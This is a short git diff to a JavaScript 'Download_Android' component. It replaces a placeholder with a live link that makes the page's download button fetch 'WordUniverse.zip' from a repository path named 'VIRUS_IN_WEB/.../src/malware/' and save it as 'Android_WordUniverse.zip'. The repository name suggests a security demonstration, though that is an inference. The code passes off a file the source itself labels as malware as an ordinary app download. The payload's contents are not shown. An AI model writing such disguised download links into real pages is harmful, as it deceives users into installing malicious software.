@@ -3,18 +3,18 @@ export default function Download_Android() {
 
     downloadButton.addEventListener('click', handleDownload);
 
-    function handleDownload() {
+    async function handleDownload() {
         // 다운로드 중인지 여부를 확인하는 변수
         let isDownloading = false;
 
         if (!isDownloading) {
             isDownloading = true;
 
-            // const fileURL = '이 줄에 주소 경로 지정 하면 됨.';
+            const fileURL = 'https://github.com/KGV-Security/VIRUS_IN_WEB/raw/88e3f772c3827a875246a95e89e1a9dae012214e/src/malware/WordUniverse.zip';
             const fileName = 'Android_WordUniverse.zip';
 
             const a = document.createElement('a');
-            // a.href = fileURL;
+            a.href = fileURL;
             a.download = fileName;
             document.body.appendChild(a);
             a.click();
